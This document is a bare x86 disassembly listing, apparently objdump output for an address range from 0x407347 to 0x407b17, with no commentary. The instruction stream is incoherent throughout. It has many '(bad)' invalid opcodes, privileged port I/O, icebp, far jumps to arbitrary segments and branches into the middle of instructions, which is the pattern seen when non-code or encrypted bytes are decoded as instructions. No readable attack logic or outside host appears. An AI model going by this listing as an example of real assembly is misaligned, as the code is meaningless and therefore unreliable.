  407347:	imul   ebx,DWORD PTR [esi],0x6a
  40734a:	push   esp
  40734b:	sub    ebx,DWORD PTR [edi]
  40734d:	into   
  40734e:	sub    DWORD PTR [edi-0x7a2a40cf],0xfc89ace0
  407358:	lea    esi,[esi-0x68]
  40735b:	pop    ebp
  40735c:	dec    ebx
  40735d:	rcr    DWORD PTR [ecx+esi*1],1
  407360:	push   0x927027f1
  407365:	stos   BYTE PTR es:[edi],al
  407366:	sbb    DWORD PTR [edi],ebx
  407368:	xchg   edx,eax
  407369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40736a:	xor    edi,DWORD PTR [ecx-0x66569772]
  407370:	adc    BYTE PTR [ebx+0x1253fcad],bl
  407376:	cmp    DWORD PTR [eax+0x57],0xe9a0c66
  40737d:	dec    esi
  40737e:	lods   eax,DWORD PTR ds:[esi]
  40737f:	inc    edi
  407380:	cli    
  407381:	and    eax,0xf403100a
  407386:	js     0x407328
  407388:	popa   
  407389:	cld    
  40738a:	fadd   DWORD PTR [ecx]
  40738c:	sahf   
  40738d:	jbe    0x407366
  40738f:	ins    DWORD PTR es:[edi],dx
  407390:	icebp  
  407391:	ret    0x5ed8
  407394:	rcl    esp,cl
  407396:	and    ebx,eax
  407398:	push   0x4d
  40739a:	bound  eax,QWORD PTR [edx]
  40739c:	leave  
  40739d:	and    ah,bl
  40739f:	xor    eax,esp
  4073a1:	fild   DWORD PTR ds:0x3dc8d9e1
  4073a7:	rol    DWORD PTR [esi-0x4d],1
  4073aa:	int3   
  4073ab:	out    dx,eax
  4073ac:	ret    0xa8f8
  4073af:	adc    cl,BYTE PTR [esi-0x1e]
  4073b2:	fwait
  4073b3:	xor    al,0x6b
  4073b5:	or     al,0x32
  4073b7:	adc    al,0x54
  4073b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073ba:	dec    eax
  4073bb:	mov    ebp,0x75dd7f70
  4073c0:	out    0xb,eax
  4073c2:	in     al,dx
  4073c3:	mov    ebp,0xe59a8b75
  4073c8:	aam    0xbd
  4073ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073cb:	jmp    0x28c2902
  4073d0:	std    
  4073d1:	mov    ebp,0x9fa58113
  4073d7:	fist   DWORD PTR [ebx-0x7]
  4073da:	adc    cl,dl
  4073dc:	inc    ebp
  4073dd:	test   al,0xa
  4073df:	mov    al,ds:0x86bcc678
  4073e4:	shr    DWORD PTR [ebp-0x1f22e9d8],cl
  4073ea:	stc    
  4073eb:	out    0xb4,al
  4073ed:	data16 jp 0x40737b
  4073f0:	mov    DWORD PTR [eax+0x72dae344],esi
  4073f6:	in     al,dx
  4073f7:	ins    DWORD PTR es:[edi],dx
  4073f8:	xor    ebx,0xffffffaf
  4073fb:	fnstsw WORD PTR [ebx]
  4073fd:	push   ecx
  4073fe:	ficom  WORD PTR [ecx+0x1126f108]
  407404:	sbb    esp,DWORD PTR [ebx-0x5f4c7e63]
  40740a:	cmp    al,0xbe
  40740c:	(bad)  
  40740d:	aas    
  40740e:	mov    dh,0x4a
  407410:	bound  ecx,QWORD PTR [ebx+0x16]
  407413:	xchg   edi,eax
  407414:	dec    ebp
  407415:	fwait
  407416:	dec    ebx
  407417:	dec    ebx
  407418:	test   BYTE PTR [edi+0xd],bl
  40741b:	mov    cl,BYTE PTR [edx-0x86a44e8]
  407421:	aam    0x7c
  407423:	jne    0x40740a
  407425:	bound  esi,QWORD PTR ds:0xea497041
  40742b:	cdq    
  40742c:	sbb    BYTE PTR [eax+0xa52692e],dh
  407432:	loop   0x4073d0
  407434:	cmp    eax,0xd305a84f
  407439:	push   eax
  40743a:	dec    esi
  40743b:	push   ecx
  40743c:	cmp    al,0xd6
  40743e:	shl    DWORD PTR [ecx],1
  407440:	dec    esi
  407441:	ja     0x407444
  407443:	inc    ebp
  407444:	xchg   edx,eax
  407445:	cli    
  407446:	iret   
  407447:	xchg   ebx,eax
  407448:	adc    ah,BYTE PTR [ebx+0x117075b6]
  40744e:	fsub   DWORD PTR [ecx]
  407450:	(bad)  
  407451:	fidiv  DWORD PTR [eax]
  407453:	pop    DWORD PTR [eax+0x30]
  407456:	jb     0x40744e
  407458:	adc    al,0x5b
  40745a:	out    0xb9,al
  40745c:	cmp    esi,eax
  40745e:	push   cs
  40745f:	imul   edi,DWORD PTR [edi+0x40],0x5d
  407463:	or     DWORD PTR [eax],eax
  407465:	jmp    0x7ddc:0xd0afebc7
  40746c:	test   eax,0xa0cb4746
  407471:	idiv   DWORD PTR [ecx+eax*2-0x70d39a46]
  407478:	lock shl DWORD PTR [esi-0x8],cl
  40747c:	jecxz  0x407484
  40747e:	jle    0x407424
  407480:	jmp    0x4074b5
  407482:	mov    cl,0xdd
  407484:	adc    ecx,DWORD PTR [bx+si+0x2ee1]
  407489:	pop    edx
  40748a:	std    
  40748b:	repz dec ebx
  40748d:	clc    
  40748e:	or     ebp,ebx
  407490:	sbb    cl,BYTE PTR [eax+0x4a]
  407493:	adc    al,0x8a
  407495:	cvtdq2ps xmm0,XMMWORD PTR [ebp+0x40]
  407499:	add    al,0x9
  40749b:	(bad)  
  40749c:	sub    eax,0xa8860010
  4074a1:	cmp    eax,esp
  4074a3:	(bad)  
  4074a4:	scas   al,BYTE PTR es:[edi]
  4074a5:	pop    esi
  4074a6:	inc    edx
  4074a7:	pop    eax
  4074a8:	retf   
  4074a9:	cmp    al,dl
  4074ab:	adc    DWORD PTR [edx-0x30b9cc8],ebx
  4074b1:	xchg   edx,eax
  4074b2:	imul   ebx,DWORD PTR [edx+0x50f58d76],0xffffffcd
  4074b9:	inc    esp
  4074ba:	pop    ss
  4074bb:	aad    0x4c
  4074bd:	dec    ebp
  4074be:	stos   DWORD PTR es:[edi],eax
  4074bf:	lds    edi,FWORD PTR [ebp-0x73b66338]
  4074c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074c6:	and    eax,0x71f268f3
  4074cb:	adc    al,0x9b
  4074cd:	mov    dl,BYTE PTR [esi+ebp*4+0x71]
  4074d1:	icebp  
  4074d2:	add    DWORD PTR [ebx],ebp
  4074d4:	mov    al,0x41
  4074d6:	rcl    eax,cl
  4074d8:	cmp    dh,BYTE PTR [edi]
  4074da:	out    dx,al
  4074db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074dc:	ret    0x967d
  4074df:	mov    edx,0xebcf7e17
  4074e4:	fcom   st(1)
  4074e6:	or     edx,DWORD PTR [ecx+0x21]
  4074e9:	(bad)  
  4074ea:	into   
  4074eb:	retf   
  4074ec:	imul   edi,ecx,0xffffffa6
  4074ef:	cmp    ebx,DWORD PTR ds:0x7f710243
  4074f5:	jae    0x407524
  4074f7:	dec    esp
  4074f8:	jp     0x4074df
  4074fa:	aad    0xdf
  4074fc:	adc    BYTE PTR [eax],ch
  4074fe:	addr16 xchg esi,eax
  407500:	cld    
  407501:	dec    esi
  407502:	stos   BYTE PTR es:[edi],al
  407503:	jp     0x4074cc
  407505:	cdq    
  407506:	add    eax,DWORD PTR [ecx+0x43]
  407509:	in     al,0x58
  40750b:	sbb    dh,BYTE PTR [edx+0x1]
  40750e:	inc    esi
  40750f:	jb     0x407572
  407511:	xor    BYTE PTR [ebp-0x2bda8b39],al
  407517:	retf   0x3d95
  40751a:	jbe    0x4074a3
  40751c:	call   0xf2c1801e
  407521:	inc    ebx
  407522:	jno    0x407583
  407524:	test   BYTE PTR [edi+0x24843629],bh
  40752a:	xchg   DWORD PTR [edi+edi*8+0x4f],esi
  40752e:	dec    ebp
  40752f:	mov    dl,BYTE PTR [edx-0x79]
  407532:	ret    0x9acc
  407535:	scas   al,BYTE PTR es:[edi]
  407536:	(bad)  
  407537:	or     eax,0xac89e84b
  40753c:	leave  
  40753d:	or     cl,BYTE PTR [esi-0x5f]
  407540:	out    0xf0,al
  407542:	repz dec esi
  407544:	outs   dx,BYTE PTR ds:[esi]
  407545:	and    BYTE PTR [ecx+edi*2-0x37],dh
  407549:	or     BYTE PTR [ebp-0x43524065],0x6d
  407550:	fsubr  QWORD PTR [ebx-0x10d89cac]
  407556:	mov    DWORD PTR [edi],esp
  407558:	add    ebp,DWORD PTR [edi+0x2c]
  40755b:	iret   
  40755c:	sub    esp,DWORD PTR [edi-0x34]
  40755f:	jno    0x407560
  407561:	inc    esp
  407562:	pop    edx
  407563:	pop    ds
  407564:	ret    0x5ac1
  407567:	dec    ecx
  407568:	and    ebx,DWORD PTR [edx-0x5ef243d4]
  40756e:	sbb    BYTE PTR ds:[eax+0x44],bl
  407572:	adc    al,0x28
  407574:	clc    
  407575:	xor    ah,BYTE PTR [ebp+0x5]
  407578:	sar    edx,1
  40757a:	xor    al,BYTE PTR [edi]
  40757c:	ficom  WORD PTR [ebp-0x6de20908]
  407582:	mov    al,0x16
  407584:	sub    eax,0x4482be1e
  407589:	out    dx,eax
  40758a:	icebp  
  40758b:	xor    DWORD PTR [eax+0x4d],edi
  40758e:	fidiv  DWORD PTR [edi+0x76bb1071]
  407594:	fldcw  WORD PTR [edx-0x635394a1]
  40759a:	jbe    0x4075ff
  40759c:	push   edi
  40759d:	adc    dl,bl
  40759f:	jmp    0xb8853c35
  4075a4:	out    0xe6,eax
  4075a6:	pop    esp
  4075a7:	push   0x6f347341
  4075ac:	shr    DWORD PTR [eax],cl
  4075ae:	cmc    
  4075af:	push   0xf212985b
  4075b4:	inc    esi
  4075b5:	xchg   esi,eax
  4075b6:	lods   eax,DWORD PTR ds:[esi]
  4075b7:	shl    bl,0xfc
  4075ba:	pop    ds
  4075bb:	cld    
  4075bc:	jecxz  0x4075d5
  4075be:	mov    ah,BYTE PTR [edx]
  4075c0:	jmp    0x407549
  4075c2:	loopne 0x40759e
  4075c4:	xchg   esp,eax
  4075c5:	aas    
  4075c6:	icebp  
  4075c7:	pop    es
  4075c8:	stc    
  4075c9:	shr    DWORD PTR [ebp-0x2faccc4a],cl
  4075cf:	bound  eax,QWORD PTR [edi+ebx*1-0x39]
  4075d3:	stos   BYTE PTR es:[edi],al
  4075d4:	adc    ebx,DWORD PTR [eax]
  4075d6:	jge    0x4075b9
  4075d8:	js     0x4075ef
  4075da:	mov    al,0xe5
  4075dc:	out    0x4b,eax
  4075de:	dec    ebx
  4075df:	mov    al,dh
  4075e1:	adc    ah,BYTE PTR [edx]
  4075e3:	mov    edx,DWORD PTR [edi+ebp*8]
  4075e6:	mov    ?,WORD PTR [ebp-0x4cbd20b8]
  4075ec:	div    al
  4075ee:	add    BYTE PTR ds:0x664c5601,al
  4075f4:	mul    DWORD PTR [ebx+0x71]
  4075f7:	dec    eax
  4075f8:	mov    esp,0x54771a53
  4075fd:	bound  esi,QWORD PTR [esi+0x14]
  407600:	shr    BYTE PTR [ecx],cl
  407602:	sbb    DWORD PTR [edx+0x7bf595ae],eax
  407608:	xchg   edx,eax
  407609:	mov    ?,WORD PTR [esi-0x3b142756]
  40760f:	xchg   edx,eax
  407610:	adc    BYTE PTR [ebp+0x66],cl
  407613:	push   0x53
  407615:	mov    bh,0x75
  407617:	pop    esi
  407618:	cld    
  407619:	int    0xa3
  40761b:	jne    0x40764e
  40761d:	fild   DWORD PTR [ecx-0x667e2cca]
  407623:	outs   dx,DWORD PTR ds:[esi]
  407624:	mov    dh,0x2c
  407626:	adc    ch,bl
  407628:	jl     0x407631
  40762a:	cmc    
  40762b:	push   ecx
  40762c:	fiadd  DWORD PTR ss:[edi]
  40762f:	mov    ebx,0xcbd7f592
  407634:	and    BYTE PTR [eax],dl
  407636:	loopne 0x4075d4
  407638:	cmp    al,BYTE PTR [ebp+0x2f]
  40763b:	add    BYTE PTR [ebx+0x64780961],dl
  407641:	and    ecx,ebx
  407643:	mov    ebx,0x14a76e65
  407648:	(bad)  
  40764a:	sub    DWORD PTR [ecx-0x20],edi
  40764d:	test   esi,0x4dcce9f3
  407653:	jmp    0x407659
  407655:	ins    DWORD PTR es:[edi],dx
  407656:	test   eax,0xbebacb2d
  40765b:	call   0xef3df586
  407660:	jle    0x40768a
  407662:	fnop   
  407664:	jbe    0x40766e
  407666:	cmp    esi,ebp
  407668:	(bad)  
  407669:	icebp  
  40766a:	pop    DWORD PTR [ecx+0x64ab6a7c]
  407670:	aad    0x70
  407672:	adc    DWORD PTR [ecx-0x48],eax
  407675:	fnstenv [ebx+ecx*2+0x5a7ddfd6]
  40767c:	test   BYTE PTR [ecx],dh
  40767e:	fsubr  DWORD PTR [esi]
  407680:	(bad)  
  407681:	mov    esp,0x60dbf894
  407686:	ins    BYTE PTR es:[edi],dx
  407687:	jno    0x4076d5
  407689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40768a:	push   es
  40768b:	iret   
  40768c:	pop    eax
  40768d:	and    DWORD PTR [ecx],esp
  40768f:	rcl    DWORD PTR [ecx+ecx*4+0x67],cl
  407693:	mov    ch,BYTE PTR [edx+0x5185985a]
  407699:	cmp    ch,BYTE PTR [ecx]
  40769b:	or     bh,dh
  40769d:	mov    edi,0x124840fb
  4076a2:	sub    esi,DWORD PTR [edx+edx*1-0x65d786f]
  4076a9:	mov    bl,0x2b
  4076ab:	in     al,0xf0
  4076ad:	jmp    0xf00:0xed35542
  4076b4:	push   0x68
  4076b6:	(bad)  
  4076b8:	scas   eax,DWORD PTR es:[edi]
  4076b9:	push   edi
  4076ba:	ja     0x407728
  4076bc:	fnsavew [esi]
  4076bf:	push   esp
  4076c0:	mov    bl,0xdf
  4076c2:	dec    eax
  4076c3:	ja     0x407679
  4076c5:	dec    ebx
  4076c6:	mov    ah,0xdf
  4076c8:	and    ah,ah
  4076ca:	mov    edi,ebp
  4076cc:	push   cs
  4076cd:	add    bl,BYTE PTR [esi+eax*2]
  4076d0:	ficomp DWORD PTR [esi]
  4076d2:	in     eax,dx
  4076d3:	shl    DWORD PTR [edx-0x7102e99a],0xc4
  4076da:	mov    esi,0x9bdec9c2
  4076df:	xchg   esp,eax
  4076e0:	xchg   edx,eax
  4076e1:	shr    DWORD PTR [edx],cl
  4076e3:	sbb    esi,edx
  4076e5:	add    eax,0xeb72b2f8
  4076ea:	push   cs
  4076eb:	inc    bp
  4076ed:	pusha  
  4076ee:	adc    al,0x2
  4076f0:	mov    ebx,0x52831311
  4076f5:	(bad)  
  4076f6:	pushf  
  4076f7:	lods   al,BYTE PTR ds:[esi]
  4076f8:	and    ebp,DWORD PTR [ebp-0x72]
  4076fb:	xchg   DWORD PTR [ebx+0x5e],esp
  4076fe:	lahf   
  4076ff:	push   ecx
  407700:	cmp    BYTE PTR [edx-0x7b82970d],dh
  407706:	lods   eax,DWORD PTR ds:[esi]
  407707:	fidiv  WORD PTR [edi+0x6e]
  40770a:	sbb    ah,BYTE PTR [ebx]
  40770c:	xor    bl,BYTE PTR [esi+0x248770e8]
  407712:	push   0x33
  407714:	(bad)  
  407715:	jg     0x407746
  407717:	(bad)
  40771a:	in     eax,dx
  40771b:	loop   0x407712
  40771d:	adc    DWORD PTR [ecx],ebx
  40771f:	sbb    al,0xc3
  407721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407722:	or     BYTE PTR [edi],dl
  407724:	cmp    eax,0x716d72ad
  407729:	mov    edi,0xb41e2bfc
  40772e:	mov    esi,0xcf5a2efa
  407733:	cmp    BYTE PTR [eax-0xc],al
  407736:	repnz inc ebx
  407738:	and    dh,BYTE PTR [eax-0x5870b942]
  40773e:	iret   
  40773f:	cmp    edi,ecx
  407741:	shr    DWORD PTR [ebx+ebx*8],cl
  407744:	sub    ebx,DWORD PTR [esi+0x31e7fccc]
  40774a:	(bad)
  40774d:	sti    
  40774e:	das    
  40774f:	fcom   QWORD PTR [ebx+edx*4+0x5e6166e0]
  407756:	fs jb  0x407786
  407759:	pop    ds
  40775a:	xor    DWORD PTR [esi+0x58359bd2],esp
  407760:	pop    esi
  407761:	inc    eax
  407762:	pop    edi
  407763:	out    0xd5,al
  407765:	mov    ds:0x32eeceb6,al
  40776a:	cwde   
  40776b:	or     ebx,edi
  40776d:	add    DWORD PTR [ebx],0xffffff84
  407770:	mov    edx,DWORD PTR ds:[ebp+ebp*8-0x1042fc25]
  407778:	imul   ebx,ebx,0x5b
  40777b:	ja     0x4077b5
  40777d:	push   0xffffffa7
  40777f:	pop    ds
  407780:	loop   0x407709
  407782:	shl    DWORD PTR fs:[ebx+0x3b],1
  407786:	mov    ebp,0xfd2f3f09
  40778b:	sbb    eax,0xcceb9b43
  407790:	shl    BYTE PTR [eax-0x2dd7bef3],1
  407796:	jmp    0x40779c
  407798:	and    bl,BYTE PTR [eax-0x1f08e86c]
  40779e:	jmp    0xf24c:0x148c5501
  4077a5:	fistp  WORD PTR [edi]
  4077a7:	das    
  4077a8:	mov    dl,0xeb
  4077aa:	add    eax,0x2ef5d1a3
  4077af:	dec    DWORD PTR [esi-0x2c]
  4077b2:	cmp    cl,BYTE PTR [ebx-0x4f]
  4077b5:	clc    
  4077b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077b7:	mov    cl,0x32
  4077b9:	shr    BYTE PTR [ebx+0x10e9c32f],cl
  4077bf:	adc    DWORD PTR [esi+0x31abb3d2],eax
  4077c5:	mov    ds:0xce310e13,al
  4077ca:	pusha  
  4077cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077cc:	mov    ebx,0xc8d74779
  4077d1:	xchg   ebx,eax
  4077d2:	mov    eax,ds:0x473febfd
  4077d7:	inc    esp
  4077d8:	cmp    edi,DWORD PTR [bp+si-0x6c]
  4077dc:	jo     0x4077aa
  4077de:	shr    BYTE PTR [edi],cl
  4077e0:	aam    0x84
  4077e2:	mov    cl,0xcb
  4077e4:	(bad)  
  4077e5:	xchg   ebp,eax
  4077e6:	push   edi
  4077e7:	nop
  4077e8:	pop    eax
  4077e9:	push   0xffffffb2
  4077eb:	aaa    
  4077ec:	xor    ah,0xc9
  4077ef:	dec    esp
  4077f0:	add    edi,DWORD PTR ss:[ebp-0x24f02915]
  4077f7:	(bad)  
  4077f9:	shl    DWORD PTR [esi+ebp*2-0x59],cl
  4077fd:	pop    ebx
  4077fe:	(bad)  
  4077ff:	xchg   ebp,eax
  407800:	hlt    
  407801:	loopne 0x40781b
  407803:	jnp    0x40781d
  407805:	sti    
  407806:	(bad)  
  407807:	icebp  
  407808:	dec    ebx
  407809:	das    
  40780a:	pop    esp
  40780b:	pop    ebx
  40780c:	mov    cl,0xf5
  40780e:	add    cl,ch
  407810:	nop
  407811:	mov    cs,WORD PTR [esp]
  407814:	push   ecx
  407815:	pop    ebp
  407816:	cmp    ch,al
  407818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407819:	jmp    0x53430705
  40781e:	mov    esp,0x8631b42a
  407823:	xchg   esp,eax
  407824:	mov    es,WORD PTR [esi-0xbea7ef5]
  40782a:	shl    ecx,0x59
  40782d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40782e:	les    ebp,FWORD PTR [eax+0x2b94e4e0]
  407834:	jmp    0xb5b9d73c
  407839:	mov    ebx,0x26b9b333
  40783e:	repnz std 
  407840:	dec    ebx
  407841:	cmc    
  407842:	ret    0x314d
  407845:	adc    al,0x63
  407847:	and    bh,ah
  407849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40784a:	xchg   DWORD PTR [eax],edi
  40784c:	adc    al,0x3c
  40784e:	xchg   esi,eax
  40784f:	and    edx,DWORD PTR [edx]
  407851:	retf   0xe291
  407854:	sbb    eax,0xf40435ac
  407859:	call   0x2748:0x570440f9
  407860:	mov    dl,0x43
  407862:	xor    eax,0xca2ee638
  407867:	jp     0x407865
  407869:	xchg   eax,edx
  40786b:	or     BYTE PTR [edx+ecx*2-0x795def0],cl
  407872:	xchg   ebp,eax
  407873:	mov    ah,0x56
  407875:	(bad)  
  407876:	adc    dl,BYTE PTR [edi]
  407878:	xchg   edi,eax
  407879:	adc    BYTE PTR [ecx+ebx*8],dl
  40787c:	rcl    dh,1
  40787e:	lock mov bh,0x40
  407881:	xchg   edi,eax
  407882:	dec    ebx
  407883:	inc    esp
  407884:	mov    al,0x3d
  407886:	sbb    eax,0x5373b71
  40788b:	mov    al,BYTE PTR [edi+0x43]
  40788e:	and    eax,0xcff5baaf
  407893:	nop
  407894:	out    dx,eax
  407895:	pushf  
  407896:	test   BYTE PTR [ebx+0x23fa22c8],ch
  40789c:	cmp    eax,0xf67ee840
  4078a1:	test   dh,cl
  4078a3:	push   ebx
  4078a4:	adc    al,0x37
  4078a6:	pop    ss
  4078a7:	pusha  
  4078a8:	jns    0x4078a4
  4078aa:	add    cl,dh
  4078ac:	sbb    BYTE PTR [edi-0x42],cl
  4078af:	(bad)  
  4078b0:	leave  
  4078b1:	mov    BYTE PTR ds:0x18eaa064,ch
  4078b7:	xchg   esi,eax
  4078b8:	es jp  0x4078af
  4078bb:	sub    BYTE PTR [ebp+0x31b49d6e],bl
  4078c1:	and    esi,DWORD PTR [edx+0x23dce257]
  4078c7:	je     0x4078f9
  4078c9:	pop    edi
  4078ca:	pop    ss
  4078cb:	dec    ebp
  4078cc:	out    dx,eax
  4078cd:	addr16 pop ebp
  4078cf:	mov    esp,0x27d3e807
  4078d4:	push   edx
  4078d5:	test   al,0x64
  4078d7:	nop
  4078d8:	jg     0x407865
  4078da:	or     esp,ebx
  4078dc:	shr    DWORD PTR [eax+0x1cc53817],0x6b
  4078e3:	test   eax,0x80e5f024
  4078e8:	test   BYTE PTR [ecx],0xf8
  4078eb:	(bad)  
  4078ec:	ret    
  4078ed:	push   es
  4078ee:	pop    es
  4078ef:	mov    ds:0xc02d43de,eax
  4078f4:	or     DWORD PTR [eax-0x2902adf0],eax
  4078fa:	mov    al,0x64
  4078fc:	adc    ah,bh
  4078fe:	jge    0x407959
  407900:	ret    
  407901:	cmp    DWORD PTR [edx],0x67
  407904:	mov    DWORD PTR cs:[esi+0x1],ebx
  407908:	mov    cl,0xb
  40790a:	fmul   DWORD PTR [ecx]
  40790c:	mov    ebp,0xcd64950f
  407911:	inc    ecx
  407912:	push   ebx
  407913:	mov    al,0xcb
  407915:	test   DWORD PTR [edx-0x4f],edi
  407918:	fwait
  407919:	mov    esi,0xee7a2f29
  40791e:	aam    0xeb
  407920:	jge    0x407939
  407922:	sub    BYTE PTR [ecx-0x57],ch
  407925:	retf   0x7b8f
  407928:	cdq    
  407929:	mov    ebp,0x9bd75246
  40792e:	cmp    al,cl
  407930:	pushf  
  407931:	adc    al,0x1
  407933:	xchg   ebx,eax
  407934:	sbb    al,0xe4
  407936:	xchg   DWORD PTR [edx],edx
  407938:	xchg   ebx,eax
  407939:	or     al,0x31
  40793b:	jmp    0x241d:0x3cd6fee6
  407942:	cmp    BYTE PTR [ebx],cl
  407944:	hlt    
  407945:	inc    esp
  407946:	push   ss
  407947:	sbb    dh,BYTE PTR [esi]
  407949:	out    0xc0,al
  40794b:	popf   
  40794c:	call   0xe324:0x12f5a589
  407953:	pop    ebp
  407954:	imul   BYTE PTR [esi-0x34]
  407957:	js     0x407905
  407959:	xchg   esp,eax
  40795a:	rcl    bh,cl
  40795c:	ins    DWORD PTR es:[edi],dx
  40795d:	and    DWORD PTR [edx],edi
  40795f:	mov    al,ds:0x2c2429ff
  407964:	(bad)  
  407965:	jmp    0x7fe6a10e
  40796a:	aas    
  40796b:	jp     0x4079e3
  40796d:	rcl    DWORD PTR [edi-0x6b7cc74f],0xe8
  407974:	jge    0x407904
  407976:	adc    eax,0x5b0ffab7
  40797b:	aas    
  40797c:	xchg   ecx,eax
  40797d:	je     0x407969
  40797f:	mov    edi,0x6ef1034a
  407984:	shl    BYTE PTR [ecx+0x7725862f],1
  40798a:	adc    al,ah
  40798c:	or     cl,cl
  40798e:	mov    dl,0xc5
  407990:	aas    
  407991:	pop    ss
  407992:	and    al,0xa4
  407994:	jns    0x407937
  407996:	cmc    
  407997:	lods   eax,DWORD PTR ds:[esi]
  407998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407999:	sbb    BYTE PTR [ebp+0x3f],0x38
  40799d:	mov    dh,0x3e
  40799f:	dec    edx
  4079a0:	adc    BYTE PTR [eax-0x45f0ebcd],al
  4079a6:	clc    
  4079a7:	xor    BYTE PTR [edx-0xbda0ab6],0x82
  4079ae:	xor    al,0x32
  4079b0:	sbb    al,0x42
  4079b2:	mov    edx,cs
  4079b4:	xor    DWORD PTR [ebp+eax*8-0x3d],0x5de14b02
  4079bc:	push   edx
  4079bd:	mov    eax,ds:0x60be09c0
  4079c2:	cmp    BYTE PTR [ecx],bh
  4079c4:	(bad)  
  4079c5:	adc    al,0x4c
  4079c7:	aad    0xbd
  4079c9:	(bad)  
  4079ca:	or     BYTE PTR [eax+eax*2-0x7c],bh
  4079ce:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4079d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079d1:	mov    ds:0x3514f089,al
  4079d6:	ja     0x407977
  4079d8:	xchg   esp,eax
  4079d9:	inc    ebx
  4079da:	mov    eax,DWORD PTR [eax]
  4079dc:	cs jno 0x4079d0
  4079df:	cmp    dl,ch
  4079e1:	je     0x4079ef
  4079e3:	inc    eax
  4079e4:	mov    ds:0x31019fb4,al
  4079e9:	and    bl,BYTE PTR [ebx-0x597e6e1a]
  4079ef:	sbb    bh,ah
  4079f1:	xlat   BYTE PTR ds:[ebx]
  4079f2:	and    al,dh
  4079f4:	or     ebx,DWORD PTR [esp+ebp*8+0x72]
  4079f8:	rcr    DWORD PTR [edi+0x5561a911],cl
  4079fe:	in     eax,0x12
  407a00:	call   0xab47:0xc867909a
  407a07:	mov    DWORD PTR [eax],esp
  407a09:	push   es
  407a0a:	scas   eax,DWORD PTR es:[edi]
  407a0b:	pop    edi
  407a0c:	imul   esp,DWORD PTR [esi-0x74fa8673],0x89ae8dd9
  407a16:	das    
  407a17:	mov    ?,WORD PTR [ebx-0x572a2db4]
  407a1d:	data16 xor BYTE PTR [esp+edi*4+0x52daffae],cl
  407a25:	mov    DWORD PTR [edi],ebx
  407a27:	gs mov edi,0x83294a25
  407a2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a2e:	das    
  407a2f:	out    0xdb,eax
  407a31:	push   ss
  407a32:	pause  
  407a34:	std    
  407a35:	mov    ah,0x7
  407a37:	fiadd  WORD PTR [edx-0x696ff8d6]
  407a3d:	mov    bl,0xcc
  407a3f:	cmp    dl,BYTE PTR [esi+ecx*8+0x60]
  407a43:	data16 shl BYTE PTR [eax+0x7e],1
  407a47:	inc    ebp
  407a48:	inc    ebx
  407a49:	add    eax,ecx
  407a4b:	sub    ecx,ecx
  407a4d:	xor    eax,DWORD PTR [esi+ecx*2+0x74854edd]
  407a54:	xchg   ah,dl
  407a56:	cmc    
  407a57:	mov    ebp,0x3c61e31e
  407a5c:	shl    BYTE PTR [bp-0x2c],0x4c
  407a61:	or     ah,BYTE PTR [edi+0x76c3beb2]
  407a67:	inc    ecx
  407a68:	mov    dh,0x6f
  407a6a:	out    dx,eax
  407a6b:	(bad)  
  407a6c:	pop    edi
  407a6d:	push   ebp
  407a6e:	fdivr  QWORD PTR [edi+0x27]
  407a71:	arpl   WORD PTR [ebx+eax*4],dx
  407a74:	test   eax,0x8faaf1f8
  407a79:	push   edx
  407a7a:	dec    ecx
  407a7b:	lds    esi,FWORD PTR [esi-0x987b8f6]
  407a81:	pop    edi
  407a82:	jo     0x407a0b
  407a84:	clc    
  407a85:	add    BYTE PTR ds:0x387de9d1,0xb5
  407a8c:	in     eax,dx
  407a8d:	xchg   edi,eax
  407a8e:	int3   
  407a8f:	xrelease mov BYTE PTR [ebx-0x4d2fe9f7],ah
  407a96:	jmp    esi
  407a98:	jle    0x407a2f
  407a9a:	xchg   ebp,eax
  407a9b:	jle    0x407aff
  407a9d:	call   0x7ca3:0x8096ff43
  407aa4:	inc    edx
  407aa5:	bound  eax,QWORD PTR [esi-0x12]
  407aa8:	mov    eax,ds:0x15916ef5
  407aad:	pop    es
  407aae:	dec    esp
  407aaf:	ins    DWORD PTR es:[edi],dx
  407ab0:	push   ss
  407ab1:	je     0x407a46
  407ab3:	or     DWORD PTR ds:0x66107465,esi
  407ab9:	test   al,0x37
  407abb:	out    0xa5,eax
  407abd:	jb     0x407b0c
  407abf:	fstp   QWORD PTR [esi]
  407ac1:	addr16 xor al,0xa1
  407ac4:	in     eax,0x25
  407ac6:	je     0x407ac1
  407ac8:	fwait
  407ac9:	push   ebx
  407aca:	hlt    
  407acb:	xchg   edx,eax
  407acc:	mov    al,0x54
  407ace:	dec    esi
  407acf:	adc    eax,0xfe07d553
  407ad4:	inc    esi
  407ad5:	retf   0x13dd
  407ad8:	(bad)  
  407ad9:	clc    
  407ada:	imul   esp,DWORD PTR [esp+edi*1+0x6c],0x5f
  407adf:	repz inc esi
  407ae2:	das    
  407ae3:	loop   0x407b11
  407ae5:	out    dx,eax
  407ae6:	repnz cli 
  407ae8:	enter  0xde98,0x65
  407aec:	push   ecx
  407aed:	pop    ss
  407aee:	add    al,0x40
  407af0:	mov    ?,WORD PTR [esp+esi*1+0x741833ec]
  407af7:	shr    BYTE PTR [ebp-0x5a],1
  407afa:	add    ah,BYTE PTR ds:0x696a5d1
  407b00:	mov    al,0xc9
  407b02:	add    BYTE PTR [esi+0x203faa9b],dh
  407b08:	push   es
  407b09:	ins    DWORD PTR es:[edi],dx
  407b0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b0b:	cli    
  407b0c:	in     eax,dx
  407b0d:	or     BYTE PTR [ecx],0x3a
  407b10:	stc    
  407b11:	fsubr  QWORD PTR [eax+0x282a57]
  407b17:	ficomp DWORD PTR [ecx+0x11]
